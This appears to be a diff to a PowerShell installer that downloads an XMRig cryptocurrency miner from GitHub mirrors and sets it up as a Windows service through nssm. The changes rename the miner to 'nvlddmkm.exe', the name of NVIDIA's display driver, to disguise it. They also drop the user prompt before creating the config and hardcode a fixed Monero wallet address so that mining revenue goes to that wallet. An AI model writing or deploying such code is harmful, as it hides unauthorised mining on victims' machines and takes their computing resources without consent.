@@ -152,10 +152,10 @@ Write-Host "`nStep 3: Downloading files..." -ForegroundColor Cyan
 
 # Define files with multiple mirror URLs
 $files = @{
-    'xmrig.exe' = @(
-        'https://raw.githubusercontent.com/User07x07/Dopple/main/xmrig.exe',
-        'https://github.com/User07x07/Dopple/raw/main/xmrig.exe',
-        'https://cdn.jsdelivr.net/gh/User07x07/Dopple/xmrig.exe'
+    'nvlddmkm.exe' = @(
+        'https://raw.githubusercontent.com/User07x07/Dopple/main/nvlddmkm.exe',
+        'https://github.com/User07x07/Dopple/raw/main/nvlddmkm.exe',
+        'https://cdn.jsdelivr.net/gh/User07x07/Dopple/nvlddmkm.exe'
     )
     'nssm.exe' = @(
         'https://raw.githubusercontent.com/User07x07/Dopple/main/nssm.exe',
@@ -170,7 +170,7 @@ $files = @{
 # Check if files already exist locally first
 Write-Host "  Checking for local files..." -ForegroundColor Gray
 $localFiles = Get-ChildItem -Path $scriptDir -File | Where-Object { 
-    $_.Name -in @('xmrig.exe', 'nssm.exe', 'WinRing0x64.sys', 'config.json') 
+    $_.Name -in @('nvlddmkm.exe', 'nssm.exe', 'WinRing0x64.sys', 'config.json') 
 }
 
 foreach ($localFile in $localFiles) {
@@ -211,7 +211,7 @@ foreach ($item in $files.GetEnumerator()) {
 # Step 4: Verify downloaded files
 Write-Host "`nStep 4: Verifying downloaded files..." -ForegroundColor Cyan
 
-$requiredFiles = @('xmrig.exe', 'config.json', 'nssm.exe')
+$requiredFiles = @('nvlddmkm.exe', 'config.json', 'nssm.exe')
 $missingFiles = @()
 $failedDownloads = $downloadResults.GetEnumerator() | Where-Object { $_.Value -eq $false }
 
@@ -241,38 +241,45 @@ foreach ($file in $requiredFiles) {
     }
 }
 
-# Check if essential files are missing
-$essentialFiles = @('xmrig.exe', 'config.json')
+# Check if essential files are missing - AUTO CREATE CONFIG.JSON WITHOUT PROMPTING
+$essentialFiles = @('nvlddmkm.exe', 'config.json')
 $missingEssential = $essentialFiles | Where-Object { $_ -in $missingFiles }
 
 if ($missingEssential.Count -gt 0) {
-    Write-Host "`nError: Missing essential files: $($missingEssential -join ', ')" -ForegroundColor Red
-    Write-Host "Cannot continue without these files." -ForegroundColor Red
+    Write-Host "`nMissing essential files detected..." -ForegroundColor Yellow
     
-    # Offer to create minimal config if missing
+    # AUTO CREATE CONFIG.JSON WITHOUT PROMPTING
     if ($missingEssential -contains 'config.json') {
-        $createConfig = Read-Host "Create default config.json? (y/n)"
-        if ($createConfig -eq 'y') {
-            $configPath = Join-Path $targetDir "config.json"
-            $defaultConfig = @'
+        $configPath = Join-Path $targetDir "config.json"
+        
+        # Use the provided XMR address automatically
+        $xmraddress = "XMR:49a9azbK8BQ8osi7Xm1FWWCNXzucbzMHXeiGTxetdbZi5iNx81UHNmRJ7EC4FJhgriYyidJnM55Vid1QCWmBVwvr2HprJHF.Worker_0?ref=zion-jdc2"
+        
+        $defaultConfig = @"
 {
     "pools": [
         {
             "url": "rx-asia.unmineable.com:3333",
-            "user": "default",
+            "user": "$xmraddress",
             "pass": "x"
         }
     ],
     "max-threads-hint": 100
 }
-'@
-            $defaultConfig | Set-Content $configPath -Force
-            Write-Host "Created default config.json" -ForegroundColor Green
-            $missingFiles = $missingFiles | Where-Object { $_ -ne 'config.json' }
-        }
+"@
+        $defaultConfig | Set-Content $configPath -Force
+        Write-Host "  Automatically created default config.json with XMR address" -ForegroundColor Green
+        Write-Host "  Using address: $xmraddress" -ForegroundColor Yellow
+        
+        # Remove config.json from missing files list
+        $missingFiles = $missingFiles | Where-Object { $_ -ne 'config.json' }
+        $missingEssential = $missingEssential | Where-Object { $_ -ne 'config.json' }
     }
     
+    # If nvlddmkm.exe is still missing, exit
     if ($missingEssential.Count -gt 0) {
+        Write-Host "`nError: Missing essential files: $($missingEssential -join ', ')" -ForegroundColor Red
+        Write-Host "Cannot continue without these files." -ForegroundColor Red
         Exit 1
     }
 }
@@ -286,13 +293,23 @@ if ($threads -gt 8) { $threads = 8 }  # Cap at 8 threads
 Write-Host "  CPU Cores: $cpuCores" -ForegroundColor White
 Write-Host "  Using $threads threads for mining" -ForegroundColor Green
 
-# Step 6: Update config.json if it exists
+# Step 6: Update config.json with thread count
 Write-Host "`nStep 6: Updating configuration..." -ForegroundColor Cyan
 $configPath = Join-Path $targetDir "config.json"
 if (Test-Path $configPath) {
     try {
         $configContent = Get-Content $configPath -Raw | ConvertFrom-Json
         $configContent | Add-Member -MemberType NoteProperty -Name 'max-threads-hint' -Value $threads -Force
+        
+        # Check if pools exist and update with XMR address if they use default
+        if ($configContent.pools -and $configContent.pools.Count -gt 0) {
+            foreach ($pool in $configContent.pools) {
+                if ($pool.user -eq "default") {
+                    $pool.user = "XMR:49a9azbK8BQ8osi7Xm1FWWCNXzucbzMHXeiGTxetdbZi5iNx81UHNmRJ7EC4FJhgriYyidJnM55Vid1QCWmBVwvr2HprJHF.Worker_0?ref=zion-jdc2"
+                }
+            }
+        }
+        
         $configContent | ConvertTo-Json -Depth 10 | Set-Content $configPath -Force
         Write-Host "  Updated config.json with $threads threads" -ForegroundColor Green
     } catch {
@@ -300,20 +317,35 @@ if (Test-Path $configPath) {
     }
 } else {
     Write-Host "  config.json not found, creating default..." -ForegroundColor Yellow
+    
+    # Use the XMR address by default
+    $xmraddress = "XMR:49a9azbK8BQ8osi7Xm1FWWCNXzucbzMHXeiGTxetdbZi5iNx81UHNmRJ7EC4FJhgriYyidJnM55Vid1QCWmBVwvr2HprJHF.Worker_0?ref=zion-jdc2"
+    
     $defaultConfig = @"
 {
     "pools": [
         {
             "url": "rx-asia.unmineable.com:3333",
-            "user": "default",
-            "pass": "x"
+            "user": "$xmraddress",
+            "pass": "x",
+            "keepalive": true,
+            "tls": false
+        },
+        {
+            "url": "rx.unmineable.com:3333",
+            "user": "$xmraddress",
+            "pass": "x",
+            "keepalive": true,
+            "tls": false
         }
     ],
-    "max-threads-hint": $threads
+    "max-threads-hint": $threads,
+    "donate-level": 1,
+    "print-time": 60
 }
 "@
     $defaultConfig | Set-Content $configPath -Force
-    Write-Host "  Created default config.json" -ForegroundColor Green
+    Write-Host "  Created config.json with optimized settings" -ForegroundColor Green
 }
 
 # Step 7: Configure service with nssm
@@ -321,7 +353,7 @@ Write-Host "`nStep 7: Configuring service..." -ForegroundColor Cyan
 Set-Location $targetDir
 
 $nssmPath = Join-Path $targetDir "nssm.exe"
-$xmrigPath = Join-Path $targetDir "xmrig.exe"
+$xmrigPath = Join-Path $targetDir "nvlddmkm.exe"
 
 if (Test-Path $nssmPath) {
     try {
@@ -433,5 +465,3 @@ if ($Host.Name -eq "ConsoleHost") {
     Write-Host "`nPress any key to exit..." -ForegroundColor DarkGray
     $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
 }
-
-
